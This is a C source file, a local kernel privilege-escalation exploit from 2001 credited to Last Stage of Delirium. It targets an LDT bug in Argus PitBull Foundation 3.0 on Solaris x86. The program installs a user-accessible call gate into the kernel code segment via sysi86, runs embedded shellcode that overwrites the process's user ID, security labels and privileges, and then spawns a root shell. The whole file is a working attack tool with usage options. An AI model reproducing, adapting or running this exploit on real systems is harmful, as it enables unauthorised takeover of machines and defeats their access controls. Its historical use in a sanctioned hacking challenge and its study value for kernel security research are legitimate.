/*## copyright LAST STAGE OF DELIRIUM apr 2001 poland        *://lsd-pl.net/ #*/
/*## ldt kernel bug (argus 3.0 mu4plus)                                      #*/

/*   the code installs trap call gate descriptor with DPL=3 targeting kernel  */
/*   code segment selector KCSSEL (DPL=0) in task local descriptor table LDT  */
/*   through sysi86(SI86DSCR,struct ssd*) system call.                        */

/*   as a result process sensitivity labels, privileges and user identifiers  */
/*   are modified and command shell is spawned. the exploit was used to win   */
/*   5th Argus Hacking Challenge, in April, 20th, 2001.                       */

#define  ARGUS 1
#include <sys/types.h>
#include <sys/sysi86.h>
#include <sys/segment.h>
#include <sys/cpuvar.h>
#include <sys/thread.h>
#include <sys/cred.h>
#include <ucontext.h>
#include <stdio.h>

#define ofs(s,m) (unsigned int)(&(((s*)0)->m))
#define ofskt()  (ofs(cpu_t,cpu_thread))
#define ofscr()  (ofs(kthread_t,t_cred))
#define ofsid()  (ofs(cred_t,cr_uid))
#define ofssl()  (ofs(cred_t,cr_sl))
#define ofspv()  (ofs(cred_t,cr_pv))
#define adr(a)   (char)(a),(char)(a>>8),(char)(a>>16),(char)(a>>24)
#define dsc(d)   (char)(d),(char)(d>>8)

char asmcode[1024]={
    0x55,                              /* pushl   %ebp                   */
    0x89,0xe5,                         /* movl    %esp,%ebp              */
    0xe8,0,0,0,0,                      /* call    <asmcode+8>            */
    0x5c,                              /* popl    %esp                   */
    0x8d,0x74,0x24,0x71,               /* leal    0x71(esp,1),%esi       */
    0x83,0xc4,0x11,                    /* addl    $0x11,%esp             */
    0x9a,0,0,0,0,0x44,0,               /* lcall   $0x44,$0x00000000      */
    0xc9,                              /* leave                          */
    0xc3,                              /* ret                            */

    0x66,0xb8,dsc(KGSSEL),             /* movw    $0x????,%ax            */
    0x8e,0xe8,                         /* movw    %ax,%gs                */
    0x65,0xa1,adr(ofskt()),            /* movl    %gs:0x????????,%eax    */
    0x8b,0x98,adr(ofscr()),            /* movl    0x????????(%eax),%ebx  */
    0x31,0xc0,                         /* xorl    %eax,%eax              */
    0x66,0xb8,0,0,                     /* movw    $0x????,%ax            */
    0x89,0x43,ofsid(),                 /* movl    %eax,0x??(%ebx)        */

    0xeb,0x00,                         /* jmp     <asmcode+??>           */

    0x8d,0xbb,adr(ofssl()),            /* leal    0x????????(%ebx),%edi  */
    0xb9,adr(3),                       /* movl    $0x????????,%ecx       */
    0x51,                              /* pushl   %ecx                   */
    0xb9,adr(sizeof(sl_t)),            /* movl    $0x????????,%ecx       */
    0x56,                              /* pushl   %esi                   */
    0xf3,0xa4,                         /* repz    movsl (%esi),(%edi)    */
    0x5e,                              /* popl    %esi                   */
    0x59,                              /* popl    %ecx                   */
    0xe2,0xf3,                         /* loop    <asmcode+83>           */
    0xcb,                              /* lret                           */

    0x8d,0xbb,adr(ofspv()),            /* leal    0x????????(%ebx),%edi  */
    0xb9,adr(PV_32*4*4),               /* movl    $0x????????,%ecx       */
    0xc6,0x44,0x0f,0xff,0xff,          /* movb    $0xff,-0x1(%edi,%ecx)  */
    0xe2,0xf9,                         /* loop    <asmcode+100>          */
    0xcb,                              /* lret                           */
};

main(int argc,char **argv){
    int c,i,j,flag=0,uid=getuid(),class,comp;
    ucontext_t uc;struct ssd s;
    sl_t *sl;

    printf("copyright LAST STAGE OF DELIRIUM apr 2001 poland  //lsd-pl.net/\n");
    printf("argus pitbull foundation 3.0 mu4plus (solaris 2.7 2.8 x86)\n");
    printf("ldt kernel bug\n\n");

    if(argc<2){
        printf("usage: %s [-u uid] [-p]|[-d|-e  class compartments]\n",argv[0]);
        exit(-1);
    }

    while((c=getopt(argc,argv,"u:dep"))!=-1){
        switch(c){
        case 'u': uid=atoi(optarg);break;
        case 'p': flag=3;break;
        case 'd': flag=2;break;
        case 'e': flag=1;
        }
    }

    *((unsigned short*)&asmcode[47])=uid;

    switch(flag){
    case 0:
        printf("uid=%d\n",uid);
        asmcode[53]=24;
        break;
    case 1:
    case 2:
        sl=(sl_t*)&asmcode[121];
        sl->sl_format=0;
        sl->sl_class=class=atoi(argv[optind++]);
        for(i=0;i<SC_32;i++) sl->sl_comp[i]=0;
        for(;optind<argc;optind++){
            comp=atoi(argv[optind]);
            if(flag==2){
                for(i=0;i<((comp+1)>>5);i++) sl->sl_comp[i]=0xffffffff;
                for(j=0;j<((comp+1)%32);j++) sl->sl_comp[i]|=(1<<(31-j));
            }else sl->sl_comp[comp>>5]|=(1<<(31-comp%32));
        }
        printf("uid=%d class=%d compartments=\n\n",uid,class);
        for(i=0;i<32;i++) printf("%08x%c",sl->sl_comp[i],((i+1)&7)?' ':'\n');
        asmcode[53]=0;
        break;
    case 3:
        printf("uid=%d priv=all\n",uid);
        asmcode[53]=25;
        break;
    }

    s.bo=(unsigned int)&asmcode[25];
    s.sel=0x44;
    s.ls=KCSSEL;
    s.acc1=GATE_UACC|GATE_386CALL;
    s.acc2=0;

    sysi86(SI86DSCR,&s);
    setuid(getuid());
    ((void(*)())asmcode)();

    execl("/bin/ksh","lsd",0);
}

